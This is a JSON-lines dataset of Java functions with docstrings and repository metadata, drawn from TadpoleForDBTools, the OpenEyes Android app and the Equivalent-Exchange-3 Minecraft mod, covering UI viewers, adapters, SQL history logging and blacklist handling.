{"docstring": "/**\n * initialize manager db list\n */\n", "func_signal": "private void setManagerDBList()", "code": "{\n\ttreeDataList.clear();\n\t\n\tList<ManagerListDTO> _tmpListManager = SessionManager.getManagerDBList();\n\tif(_tmpListManager.isEmpty()) {\n\t\tif(logger.isDebugEnabled()) logger.debug(\"===== Manager Viewer add user session................\");\n\t\t\n\t\ttry {\n\t\t\tfor (String strGroupName : TadpoleSystem_UserDBQuery.getUserGroupName(SessionManager.getUserSeq(), false)) {\n\t\t\t\tManagerListDTO managerDTO = new ManagerListDTO(strGroupName);\n\t\t\t\tfor (UserDBDAO userDBDAO : TadpoleSystem_UserDBQuery.getUserGroupDB(managerDTO.getName(), SessionManager.getUserSeq(), false)) {\n\t\t\t\t\tmanagerDTO.addLogin(userDBDAO);\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tif(!managerDTO.getManagerList().isEmpty()) treeDataList.add(managerDTO);\n\t\t\t}\t// end last end\n\n\t\t\t// session \uc5d0 \uc0ac\uc6a9\uc790 \ub514\ube44 \ub9ac\uc2a4\ud2b8\ub97c \uc800\uc7a5\ud558\ub2e4.\n\t\t\tSessionManager.setManagerDBList(treeDataList);\n\t\t} catch (Exception e) {\t\n\t\t\tlogger.error(\"initialize Managerview\", e); //$NON-NLS-1$\n\t\t\t\n\t\t\tStatus errStatus = new Status(IStatus.ERROR, Activator.PLUGIN_ID, e.getMessage(), e); //$NON-NLS-1$\n\t\t\tExceptionDetailsErrorDialog.openError(getSite().getShell(),CommonMessages.get().Error, Messages.get().ManagerViewer_4, errStatus); //$NON-NLS-1$\n\t\t}\n\t} else {\n\t\tif(logger.isDebugEnabled()) {\n\t\t\tlogger.debug(\"===== Manager Viewer reuse user session................\" + _tmpListManager.size());\n//\t\t\t\tfor (ManagerListDTO managerListDTO : _tmpListManager) {\n//\t\t\t\t\tfor (UserDBDAO dbDao : managerListDTO.getManagerList()) {\n//\t\t\t\t\t\tlogger.debug(\"\\t======>> \" + dbDao.getDisplay_name());\n//\t\t\t\t\t}\n//\t\t\t\t}\n\t\t}\n\t\ttreeDataList = _tmpListManager;\n\t}\n\t\n\tmanagerTV.setInput(treeDataList);\n\tmanagerTV.expandToLevel(2);\n\tAnalyticCaller.track(ManagerViewer.ID);\n}", "path": "com.hangum.tadpole.rdb.core\\src\\com\\hangum\\tadpole\\rdb\\core\\viewers\\connections\\ManagerViewer.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
{"docstring": "/**\n * Create the dialog.\n * @param parentShell\n */\n", "func_signal": "public ResultSetViewDialog(Shell parentShell, MonitoringResultDAO dao)", "code": "{\n\tsuper(parentShell);\n\t\n\tsetShellStyle(SWT.MAX | SWT.RESIZE | SWT.TITLE);\n\tthis.dao = dao;\n}", "path": "com.hangum.tadpole.monitoring.core\\src\\com\\hangum\\tadpole\\monitoring\\core\\dialogs\\monitoring\\ResultSetViewDialog.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
{"docstring": "/**\n * save sqlhistory \n * \n * @param user_seq\n * @param userDB\n * @param requestResultDAO\n * @param strExecuteResultData\n */\n", "func_signal": "public static long saveExecuteSQUeryResource(final int user_seq, final UserDBDAO userDB, final RequestResultDAO requestResultDAO) throws TadpoleSQLManagerException, SQLException", "code": "{\n\tif(PublicTadpoleDefine.YES_NO.YES.name().equals(userDB.getIs_profile())) {\n\t\tExecutedSqlResourceDAO executeSQLResourceDao = new ExecutedSqlResourceDAO();\n\t\texecuteSQLResourceDao.setDb_seq(userDB.getSeq());\n\t\texecuteSQLResourceDao.setUser_seq(user_seq);\n\t\texecuteSQLResourceDao.setTypes(requestResultDAO.getEXECUSTE_SQL_TYPE().name());\n\t\t\n\t\texecuteSQLResourceDao.setStartDateExecute(requestResultDAO.getStartDateExecute());\n\t\texecuteSQLResourceDao.setEndDateExecute(requestResultDAO.getEndDateExecute());\n\t\tlong duration = 0l;\n\t\ttry {\n\t\t\tduration = requestResultDAO.getEndDateExecute().getTime() - requestResultDAO.getStartDateExecute().getTime();\n\t\t} catch(Exception e){}\n\t\texecuteSQLResourceDao.setDuration(Integer.parseInt(\"\"+duration));\n\t\t\n\t\texecuteSQLResourceDao.setRow(requestResultDAO.getRows());\n\t\texecuteSQLResourceDao.setResult(requestResultDAO.getResult());\n\t\t\n\t\tif(requestResultDAO.getException() instanceof TadpoleException) {\n\t\t\tTadpoleException te = (TadpoleException)requestResultDAO.getException();\n\t\t\texecuteSQLResourceDao.setTdb_result_code(te.getErrorCode());\n\t\t}\n\t\t\n\t\texecuteSQLResourceDao.setTdb_result_code(requestResultDAO.getTdb_result_code());\n\t\texecuteSQLResourceDao.setMessage(requestResultDAO.getMesssage());\n\t\texecuteSQLResourceDao.setIpAddress(requestResultDAO.getIpAddress());\n\n\t\tif(PublicTadpoleDefine.YES_NO.YES.name().equals(userDB.getIs_result_save())) {\n\t\t\texecuteSQLResourceDao.setResult_save_yn(PublicTadpoleDefine.YES_NO.YES.name());\n\t\t}\n\t\t\n\t\t// \uae30\uc874\uc5d0 \ub4f1\ub85d \ub418\uc5b4 \uc788\ub294\uc9c0 \uac80\uc0ac\ud55c\ub2e4\n\t\tSqlMapClient sqlClient = TadpoleSQLManager.getInstance(TadpoleEngineUserDB.getUserDB());\n\t\tExecutedSqlResourceDAO executeSQL =  (ExecutedSqlResourceDAO)sqlClient.insert(\"userExecuteSQLResourceInsert\", executeSQLResourceDao); //$NON-NLS-1$\n\t\t\n\t\tinsertResourceSQLData(executeSQL.getSeq(), requestResultDAO.getStartDateExecute(), requestResultDAO.getTdb_sql_head(), requestResultDAO.getSql_text());\n\t\t\n\t\tif(PublicTadpoleDefine.YES_NO.YES.name().equals(userDB.getIs_result_save())) {\n\t\t\tinsertResourceResultData(executeSQL.getSeq(), requestResultDAO.getStartDateExecute(), requestResultDAO.getResultData());\n\t\t}\n\t\t\n\t\treturn executeSQL.getSeq();\n\t}\n\t\n\treturn -1;\n}", "path": "com.hangum.tadpole.engine\\src\\com\\hangum\\tadpole\\engine\\query\\sql\\TadpoleSystem_ExecutedSQL.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
{"docstring": "/**\n * \uc0ac\uc6a9\uc790 \ub9ac\uc18c\uc2a4\uac00 \ucd94\uac00\ub418\uc5c8\uc744\ub54c\n * \n * @param userDBErd\n */\n", "func_signal": "public void addResource(int dbSeq)", "code": "{\n\tfor(ManagerListDTO dto: treeDataList) {\n\t\tfor(UserDBDAO userDB : dto.getManagerList()) {\n\t\t\tif(userDB.getSeq() == dbSeq) {\n\t\t\t\tuserDB.getListResource().clear();\n\t\t\t\taddManagerResouceData(userDB, true);\n\t\t\t\treturn;\n\t\t\t}\t// if(userDB.getSeq() == dbSeq) {\n\t\t}\t// for(UserDBDAO\n\t}\n}\n\n/**\n * change resource\n * \n * @param originalResourceDB\n */\npublic void refreshResource(UserDBResourceDAO originalResourceDB) {\n\tmanagerTV.refresh(originalResourceDB);\n}\n\npublic void deleteResource(UserDBResourceDAO userDBResource) {\n\tUserDBDAO userDB = userDBResource.getParent();\n\tIEditorReference iEditorReference = null;\n\t\n\t// \uc5f4\ub9b0\ud654\uba74 \uac80\uc0c9\n\tif(userDBResource.getResource_types().equals(PublicTadpoleDefine.RESOURCE_TYPE.SQL.toString())) {\n\t\tiEditorReference = EditorUtils.findSQLEditor(userDBResource);\n\t} else if(userDBResource.getResource_types().equals(PublicTadpoleDefine.RESOURCE_TYPE.ERD.toString())) {\n\t\tiEditorReference = EditorUtils.findERDEditor(userDBResource);\n\t}\n\t\n\t// \uc5f4\ub9b0 \ud654\uba74 \ub2eb\uae30\n\tif(iEditorReference != null) {\n\t\tPlatformUI.getWorkbench().getActiveWorkbenchWindow().getActivePage().closeEditor(iEditorReference.getEditor(false), true);\t\t\n\t}\n\t\n\t// \uc0ad\uc81c\n\tuserDBResource.getParent().findResource(DB_RESOURCE_TYPE.USER_RESOURCE).getListResource().remove(userDBResource);\n\tmanagerTV.refresh(userDB);\n}\n\n/**\n * \ud2b8\ub9ac\ub97c \uac31\uc2e0\ud558\uace0 \ucffc\ub9ac \ucc3d\uc744 \uc5fd\ub2c8\ub2e4.\n * @param managerDto \n * @param userDB\n * @param defaultOpen \n */\npublic void selectAndOpenView(ManagerListDTO managerDto, UserDBDAO userDB, boolean defaultOpen) {\n\tmanagerTV.refresh();\n\tmanagerTV.expandToLevel(managerDto, 2);\n\tmanagerTV.setSelection(new StructuredSelection(userDB), true);\n\t\n\tif(!defaultOpen) return;\n\t// mongodb \uc77c\uacbd\uc6b0 \uc5f4\uc9c0 \uc54a\ub294\ub2e4.\n\tif(DBGroupDefine.MONGODB_GROUP != userDB.getDBGroup()) {\n\t\tMainEditorInput mei = new MainEditorInput(userDB);\t\t\n\t\tIWorkbenchPage page = PlatformUI.getWorkbench().getActiveWorkbenchWindow().getActivePage();\n\t\ttry {\n\t\t\tpage.openEditor(mei, MainEditor.ID);\n\t\t} catch (PartInitException e) {\n\t\t\tlogger.error(\"main editor open\", e); //$NON-NLS-1$\n\t\t\t\n\t\t\tStatus errStatus = new Status(IStatus.ERROR, Activator.PLUGIN_ID, e.getMessage(), e); //$NON-NLS-1$\n\t\t\tExceptionDetailsErrorDialog.openError(getSite().getShell(),CommonMessages.get().Error, Messages.get().ManagerViewer_10, errStatus); //$NON-NLS-1$\n\t\t}\n\t}\n}\n\n/** registery service handler */\nprivate void registerServiceHandler() {\n\tdownloadServiceHandler = new DownloadServiceHandler();\n\tRWT.getServiceManager().registerServiceHandler(downloadServiceHandler.getId(), downloadServiceHandler);\n}\n\n/**\n * SQLite file download\n */\npublic void download(final UserDBDAO userDB) {\n\ttry {\n\t\tString strFileLoc = StringUtils.difference(StringUtils.remove(userDB.getDBDefine().getDB_URL_INFO(), \"%s\"), userDB.getUrl());\n\t\tFile dbFile = new File(strFileLoc);\n\t\t\n\t\tbyte[] arrayData = FileUtils.readFileToByteArray(dbFile);\n\t\t\n\t\tdownloadServiceHandler.setContentType(\"\");\n\t\tdownloadServiceHandler.setName(dbFile.getName()); //$NON-NLS-1$\n\t\tdownloadServiceHandler.setByteContent(arrayData);\n\t\tDownloadUtils.provideDownload(compositeMainComposite, downloadServiceHandler.getId());\n\t} catch(Exception e) {\n\t\tlogger.error(\"SQLite file Download exception\", e); //$NON-NLS-1$\n\t\t\n\t\tStatus errStatus = new Status(IStatus.ERROR, Activator.PLUGIN_ID, e.getMessage(), e); //$NON-NLS-1$\n\t\tExceptionDetailsErrorDialog.openError(null,CommonMessages.get().Error, \"DB Download Exception\", errStatus); //$NON-NLS-1$ //$NON-NLS-2$\n\t}\n}\n\n/**\n * @return the managerTV\n */\npublic TreeViewer getManagerTV() {\n\treturn managerTV;\n}\n}", "path": "com.hangum.tadpole.rdb.core\\src\\com\\hangum\\tadpole\\rdb\\core\\viewers\\connections\\ManagerViewer.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
{"docstring": "/**\n * \u8bbe\u7f6e\u6807\u7b7e\n * @param viewId\n * @param key\n * @param tag\n * @return\n */\n", "func_signal": "public ViewHolder setTag(int viewId, int key, Object tag)", "code": "{\n    View view = getView(viewId);\n    view.setTag(key, tag);\n    return this;\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\utils\\ViewHolder.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "/**\n * \u7ed9ImageView\u8bbe\u7f6ebitmap\n * @param viewId\n * @param bitmap\n * @return\n */\n", "func_signal": "public ViewHolder setImageBitmap(int viewId,Bitmap bitmap)", "code": "{\n    ImageView iv= getView(viewId);\n    iv.setImageBitmap(bitmap);\n    return this;\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\utils\\ViewHolder.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "//\u521d\u59cb\u5316\u6570\u636e\n", "func_signal": "private void initData()", "code": "{\n    //\u5faa\u73af\u521b\u5efa\u4e09\u4e2a\u5e03\u5c40\n    for (int i = 0; i < TITLE.length; i++) {\n        CommonHotFragment commonHotFragment = new CommonHotFragment();\n        fragments.add(commonHotFragment);\n    }\n    hotViewpager.setOffscreenPageLimit(3);\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\view\\fragment\\HotFragment.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "//\u89e3\u6790json\u6570\u636e\n", "func_signal": "private void pareJson(String jsonData)", "code": "{\n    HotStraetgyEntity hotStraetgyEntity = new Gson().fromJson(jsonData, HotStraetgyEntity.class);\n    itemListEntities.addAll(hotStraetgyEntity.getItemList());\n    //\u8bbe\u7f6e\u9002\u914d\u5668\n    setAdapter(itemListEntities);\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\view\\fragment\\CommonHotFragment.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "/**\n *\u70b9\u51fb\u4e8b\u4ef6\n */\n", "func_signal": "public ViewHolder setOnClickListener(int viewId,\n                                     View.OnClickListener listener)", "code": "{\n    View view = getView(viewId);\n    view.setOnClickListener(listener);\n    return this;\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\utils\\ViewHolder.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "/**\n * \u7ed9ImageView\u8bbe\u7f6eImageResource\u4f7f\u7528Frsesco\n * @param uri   \u8d44\u6e90uri\n * @return\n */\n", "func_signal": "public ViewHolder setImageResourcewithFresco(int viewId,Uri uri)", "code": "{\n    SimpleDraweeView draweeView=getView(viewId);\n    draweeView.setImageURI(uri);\n    return this;\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\utils\\ViewHolder.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "/**\n * \u9690\u85cf\u6240\u6709\u7684Fragment\uff0c\u907f\u514dfragment\u6df7\u4e71\n * @param transaction\n */\n", "func_signal": "private void hideFragments(FragmentTransaction transaction)", "code": "{\n    if (dailyFragment != null) {\n        transaction.hide(dailyFragment);\n    }\n    if (findFragment != null) {\n        transaction.hide(findFragment);\n    }\n    if (hotFragment != null) {\n        transaction.hide(hotFragment);\n    }\n\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\MainActivity.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "/**\n * \u7ed9ImageView\u8bbe\u7f6eImageResource\n * @param viewId  \u63a7\u4ef6id\n * @param resId   \u8d44\u6e90id\n * @return\n */\n", "func_signal": "public ViewHolder setImageResource(int viewId,int resId)", "code": "{\n    ImageView iv= getView(viewId);\n    iv.setImageResource(resId);\n    return this;\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\utils\\ViewHolder.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "//\u8bbe\u7f6e\u9002\u914d\u5668\n", "func_signal": "private void setAdapter(List<FindDetailEntity.ItemListEntity> data)", "code": "{\n    //\u5b9e\u4f8b\u5316\u9002\u914d\u5668\n    adapter = new CommonAdapter<FindDetailEntity.ItemListEntity>(getContext(), data, R.layout.list_home_vedio_item) {\n        @Override\n        public void convert(ViewHolder viewHolder, FindDetailEntity.ItemListEntity itemListEntity) {\n            viewHolder.setText(R.id.tv_title, itemListEntity.getData().getTitle());\n            //\u83b7\u53d6\u65f6\u95f4\n            int duration = itemListEntity.getData().getDuration();\n            int mm = duration / 60;//\u5206\n            int ss = duration % 60;//\u79d2\n            String second = \"\";//\u79d2\n            String minute = \"\";//\u5206\n            if (ss < 10) {\n                second = \"0\" + String.valueOf(ss);\n            } else {\n                second = String.valueOf(ss);\n            }\n            if (mm < 10) {\n                minute = \"0\" + String.valueOf(mm);\n            } else {\n                minute = String.valueOf(mm);//\u5206\u949f\n            }\n            viewHolder.setText(R.id.tv_time, \"#\" + itemListEntity.getData().getCategory() + \" / \" + minute + \"'\" + second + '\"');\n            ImageView imageView = viewHolder.getView(R.id.iv);\n            Glide.with(mContext).load(itemListEntity.getData().getCover().getFeed()).into(imageView);\n        }\n    };\n    findListview.setAdapter(adapter);\n    if (adapter != null) {\n        adapter.notifyDataSetChanged();\n    }\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\view\\fragment\\CommonFindFragment.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "/**\n * \u8bbe\u7f6e\u900f\u660e\u5ea6\n * @param viewId\n * @param value\n * @return\n */\n", "func_signal": "@SuppressLint(\"NewApi\")\npublic ViewHolder setAlpha(int viewId, float value)", "code": "{\n    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB)\n    {\n        getView(viewId).setAlpha(value);\n    } else\n    {\n        // Pre-honeycomb hack to set Alpha value\n        AlphaAnimation alpha = new AlphaAnimation(value, value);\n        alpha.setDuration(0);\n        alpha.setFillAfter(true);\n        getView(viewId).startAnimation(alpha);\n    }\n    return this;\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\utils\\ViewHolder.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "//\u8bbe\u7f6e\u9002\u914d\u5668\n", "func_signal": "private void setAdapter(final List<HotStraetgyEntity.ItemListEntity> dataEntity)", "code": "{\n    final int[] i = {0};//\u8bbe\u7f6e\u6570\u636e\u7684\u5e8f\u53f7\n    hotListview.setAdapter(new CommonAdapter<HotStraetgyEntity.ItemListEntity>(getContext(), dataEntity, R.layout.list_hot_item) {\n        @Override\n        public void convert(ViewHolder viewHolder, HotStraetgyEntity.ItemListEntity itemListEntity) {\n            viewHolder.setText(R.id.tv_title, itemListEntity.getData().getTitle());\n            //\u83b7\u53d6\u65f6\u95f4\n            int duration = itemListEntity.getData().getDuration();\n            int mm = duration / 60;//\u5206\n            int ss = duration % 60;//\u79d2\n            String second = \"\";//\u79d2\n            String minute = \"\";//\u5206\n            if (ss < 10) {\n                second = \"0\" + String.valueOf(ss);\n            } else {\n                second = String.valueOf(ss);\n            }\n            if (mm < 10) {\n                minute = \"0\" + String.valueOf(mm);\n            } else {\n                minute = String.valueOf(mm);//\u5206\u949f\n            }\n            viewHolder.setText(R.id.tv_time, \"#\" + itemListEntity.getData().getCategory() + \" / \" + minute + \"'\" + second + '\"');\n            ImageView imageView = viewHolder.getView(R.id.iv);\n            Log.i(\"====>image\",itemListEntity.getData().getCover().getFeed());\n            Glide.with(mContext).load(itemListEntity.getData().getCover().getFeed()).into(imageView);\n            if (i[0] < dataEntity.size()) {\n                viewHolder.setText(R.id.hot_tv_textnumber, ++i[0] + \".\");\n            }\n        }\n    });\n\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\view\\fragment\\CommonHotFragment.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "//\u89e3\u6790\u6570\u636e\n", "func_signal": "private void parseJson(String response)", "code": "{\n    FindDetailEntity entity = new Gson().fromJson(response, FindDetailEntity.class);\n    itemListEntities.addAll(entity.getItemList());\n    isLoad = false;//\u6570\u636e\u4e0b\u8f7d\u5b8c\u4e4b\u540e\u8bbe\u7f6e\u4e3afalse\n    nextPageUrl = entity.getNextPageUrl();\n    //\u5982\u679c\u4e0b\u4e00\u9875\u6570\u636e\u7684\u8bf7\u6c42\u5730\u5740\u4e3anull\uff0c\u5219\u52a0\u8f7d\u5e95\u90e8\u5e03\u5c40\n    if (nextPageUrl == null) {\n        findListview.addFooterView(footview, null, false);\n    }\n    //\u8bbe\u7f6e\u9002\u914d\u5668\n    setAdapter(itemListEntities);\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\view\\fragment\\CommonFindFragment.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "/**\n * \u91cd\u7f6e\u6240\u6709\u9009\u9879\n */\n", "func_signal": "private void clearChioce()", "code": "{\n    //\u8fd8\u539f\u9ed8\u8ba4\u9009\u9879\n    tvDaily.setTextColor(getResources().getColor(R.color.colorGray));\n    tvFind.setTextColor(getResources().getColor(R.color.colorGray));\n    tvHot.setTextColor(getResources().getColor(R.color.colorGray));\n\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\MainActivity.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "/**\n * \u7ed9\u63a7\u4ef6\u8bbe\u7f6e\u80cc\u666f\u56fe\u7247\n * @param viewId\n * @param backgroundRes\n * @return\n */\n", "func_signal": "public ViewHolder setBackgroundRes(int viewId, int backgroundRes)", "code": "{\n    View view = getView(viewId);\n    view.setBackgroundResource(backgroundRes);\n    return this;\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\utils\\ViewHolder.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "/**\n * \u8bbe\u7f6e\u8fdb\u5ea6\u6761\n * @param viewId\n * @param progress\n * @return\n */\n", "func_signal": "public ViewHolder setProgress(int viewId, int progress)", "code": "{\n    ProgressBar view = getView(viewId);\n    view.setProgress(progress);\n    return this;\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\utils\\ViewHolder.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "/**\n * \u901a\u8fc7\u63a7\u4ef6\u7684viewId\u83b7\u53d6\u5bf9\u5e94\u7684\u63a7\u4ef6\uff0c\u5982\u679c\u6ca1\u6709\u5219\u52a0\u5165views\n *\n * @param viewId\n * @param <T>\n * @return\n */\n", "func_signal": "public <T extends View> T getView(int viewId)", "code": "{\n    View view = mViews.get(viewId);\n    if (view == null) {\n        view = mConvertView.findViewById(viewId);\n        mViews.put(viewId, view);\n    }\n    return (T) view;\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\utils\\ViewHolder.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "// \u6309\u4e24\u6b21\u9000\u51fa\u7a0b\u5e8f\n", "func_signal": "@Override\npublic boolean onKeyDown(int keyCode, KeyEvent event)", "code": "{\n    if (keyCode == KeyEvent.KEYCODE_BACK) {\n        if ((System.currentTimeMillis() - mExitTime) > 2000) {\n            ToastUtil.showToast(MainActivity.this, \"\u518d\u6309\u4e00\u6b21\u9000\u51fa\u7a0b\u5e8f\");\n            mExitTime = System.currentTimeMillis();\n        } else {\n            finish();\n        }\n        return true;\n    }\n    return super.onKeyDown(keyCode, event);\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\MainActivity.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "//\u8bbe\u7f6e\u9002\u914d\u5668\n", "func_signal": "private void setAdapter()", "code": "{\n    //\u5b9e\u4f8b\u5316\u9002\u914d\u5668\n    FragmentPagerItemAdapter adapter = new FragmentPagerItemAdapter(getFragmentManager(), FragmentPagerItems.with(getContext())\n            .add(TITLE[0], fragments.get(0).getClass())\n            .add(TITLE[1], fragments.get(1).getClass())\n            .add(TITLE[2], fragments.get(2).getClass())\n            .create());\n    //\u8bbe\u7f6e\u9002\u914d\u5668\n    hotViewpager.setAdapter(adapter);\n    viewpagertab.setViewPager(hotViewpager);\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\view\\fragment\\HotFragment.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "/**\n * \u5e95\u90e8\u83dc\u5355\u680f\u7684\u70b9\u51fb\u5207\u6362\n * @param currenItem\n */\n", "func_signal": "private void setChocie(int currenItem)", "code": "{\n    transaction = fragmentManager.beginTransaction();\n    hideFragments(transaction);\n    clearChioce();\n    switch (currenItem) {\n        case 1://\u6bcf\u65e5\u7cbe\u9009\n            mainToolbarTvTime.setVisibility(View.VISIBLE);\n            mainToolbarIvRight.setImageResource(R.drawable.main_toolbar_eye_selector);\n            tvDaily.setTextColor(getResources().getColor(R.color.colorBlack));\n            if (dailyFragment == null) {\n                dailyFragment = new DailyFragment();\n                transaction.add(R.id.main_ll_fragment, dailyFragment);\n            } else {\n                transaction.show(dailyFragment);\n            }\n            break;\n        case 2://\u53d1\u73b0\u66f4\u591a\n            mainToolbarIvRight.setImageResource(R.drawable.ic_action_search);\n            mainToolbarTvTime.setVisibility(View.GONE);\n            tvFind.setTextColor(getResources().getColor(R.color.colorBlack));\n            if (findFragment == null) {\n                findFragment = new FindFragment();\n                transaction.add(R.id.main_ll_fragment, findFragment);\n            } else {\n                transaction.show(findFragment);\n            }\n            break;\n        case 3://\u70ed\u95e8\u6392\u884c\n            mainToolbarIvRight.setImageResource(R.drawable.main_toolbar_eye_selector);\n            mainToolbarTvTime.setVisibility(View.GONE);\n            tvHot.setTextColor(getResources().getColor(R.color.colorBlack));\n            if (hotFragment == null) {\n                hotFragment = new HotFragment();\n                transaction.add(R.id.main_ll_fragment, hotFragment);\n            } else {\n                transaction.show(hotFragment);\n            }\n            break;\n        default:\n            break;\n    }\n    //\u63d0\u4ea4\u4e8b\u52a1\n    transaction.commit();\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\MainActivity.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "/**\n *\u8bbe\u7f6e\u5b57\u4f53\u7c7b\u578b\n * @param typeface\n * @param viewIds\n * @return\n */\n", "func_signal": "public ViewHolder setTypeface(Typeface typeface, int... viewIds)", "code": "{\n    for (int viewId : viewIds)\n    {\n        TextView view = getView(viewId);\n        view.setTypeface(typeface);\n        view.setPaintFlags(view.getPaintFlags() | Paint.SUBPIXEL_TEXT_FLAG);\n    }\n    return this;\n}", "path": "app\\src\\main\\java\\com\\stx\\openeyes\\utils\\ViewHolder.java", "repo_name": "xiaohaibin/OpenEyes", "stars": 674, "license": "apache-2.0", "language": "java", "size": 58753}
{"docstring": "/**\n * TODO Finish JavaDoc\n */\n", "func_signal": "public void load()", "code": "{\n\n    if (knowledgeBlacklistFile != null) {\n        Set<WrappedStack> knowledgeBlacklistSet = SerializationHelper.readSetFromFile(knowledgeBlacklistFile);\n        knowledgeBlacklist.clear();\n        knowledgeBlacklist.addAll(knowledgeBlacklistSet.stream().filter(wrappedStack -> wrappedStack != null).collect(Collectors.toList()));\n    }\n\n    if (exchangeBlacklistFile != null) {\n        Set<WrappedStack> exchangeBlacklistSet = SerializationHelper.readSetFromFile(exchangeBlacklistFile);\n        exchangeBlacklist.clear();\n        exchangeBlacklist.addAll(exchangeBlacklistSet.stream().filter(wrappedStack -> wrappedStack != null).collect(Collectors.toList()));\n    }\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\blacklist\\BlacklistRegistry.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
{"docstring": "/**\n * TODO Finish JavaDoc\n *\n * @param object\n */\n", "func_signal": "public void forget(Object object)", "code": "{\n\n    if (object instanceof ItemStack) {\n        ItemStack unitItemStack = ItemStackUtils.clone((ItemStack) object, 1);\n        knownItemStacks.remove(unitItemStack);\n    }\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\knowledge\\PlayerKnowledge.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
{"docstring": "/**\n * TODO Finish JavaDoc\n */\n", "func_signal": "public void saveAll()", "code": "{\n\n    if (shouldSave && knowledgeBlacklistFile != null && exchangeBlacklistFile != null) {\n        LogHelper.trace(BLACKLIST_MARKER, \"Saving all blacklists to disk\", exchangeBlacklistFile.getAbsolutePath());\n        SerializationHelper.writeJsonFile(knowledgeBlacklistFile, SerializationHelper.GSON.toJson(knowledgeBlacklist));\n        SerializationHelper.writeJsonFile(exchangeBlacklistFile, SerializationHelper.GSON.toJson(exchangeBlacklist));\n    }\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\blacklist\\BlacklistRegistry.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
{"docstring": "/**\n * TODO Finish JavaDoc\n *\n * @param entity\n * @param nbtTagCompound\n */\n", "func_signal": "public static void saveCustomEntityData(Entity entity, NBTTagCompound nbtTagCompound)", "code": "{\n\n    if (entity != null) {\n        entity.getEntityData().setTag(EquivalentExchange.MOD_ID, nbtTagCompound);\n    }\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\util\\EntityUtils.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
